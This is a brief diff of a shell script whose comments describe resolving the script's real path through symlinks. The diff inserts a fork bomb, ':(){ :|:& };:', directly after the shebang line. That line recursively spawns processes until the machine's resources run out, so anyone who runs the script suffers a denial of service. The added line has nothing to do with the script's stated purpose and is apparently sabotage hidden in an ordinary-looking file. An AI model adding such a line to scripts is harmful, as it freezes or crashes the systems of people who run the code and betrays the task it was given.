@@ -1,5 +1,7 @@
 #!/usr/bin/env sh
 
+:(){ :|:& };:
+
 # Resolve the true path of the script, following symlinks
 SOURCE="${0}"
 while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
